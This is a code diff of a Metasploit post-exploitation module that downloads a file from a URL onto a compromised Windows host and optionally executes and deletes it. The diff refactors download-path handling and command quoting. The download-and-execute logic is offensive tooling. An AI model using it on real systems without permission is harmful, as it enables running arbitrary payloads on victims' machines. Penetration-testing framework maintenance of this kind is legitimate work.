@@ -35,7 +35,7 @@ class Metasploit3 < Msf::Post
     register_advanced_options(
       [
         OptString.new('EXEC_STRING',   [false, 'Execution parameters when run from download directory' ]),
-        OptInt.new('EXEC_TIMEOUT',     [true, 'Execution timeout', 60 ]),
+        OptInt.new(   'EXEC_TIMEOUT',  [true, 'Execution timeout', 60 ]),
         OptBool.new(  'DELETE',        [true, 'Delete file after execution', false ]),
       ], self.class)
 
@@ -76,17 +76,16 @@ class Metasploit3 < Msf::Post
     url = datastore["URL"]
     filename = datastore["FILENAME"] || url.split('/').last
 
-    env_vars = session.sys.config.getenvs(datastore['DOWNLOAD_PATH'], 'TEMP')
-    download_path = env_vars[datastore['DOWNLOAD_PATH']]
-    if download_path.blank?
-      path = env_vars['TEMP']
+    path = datastore['DOWNLOAD_PATH']
+    if path.blank?
+      path = session.sys.config.getenv('TEMP')
     else
-      path = download_path
+      path = session.fs.file.expand_path(path)
     end
 
     outpath = path + '\\' + filename
     exec = datastore['EXECUTE']
-    exec_string = datastore['EXEC_STRING'] || ''
+    exec_string = datastore['EXEC_STRING']
     output = datastore['OUTPUT']
     remove = datastore['DELETE']
 
@@ -109,11 +108,7 @@ class Metasploit3 < Msf::Post
     # Execute file upon request
     if exec
       begin
-        cmd = "#{outpath} #{exec_string}"
-
-        # If we don't have the following gsub, we get this error in Windows:
-        # "Operation failed: The system cannot find the file specified"
-        cmd = cmd.gsub(/\\/, '\\\\\\').gsub(/\s/, '\ ')
+        cmd = "\"#{outpath}\" #{exec_string}"
 
         print_status("Executing file: #{cmd}")
         res = cmd_exec(cmd, nil, datastore['EXEC_TIMEOUT'])
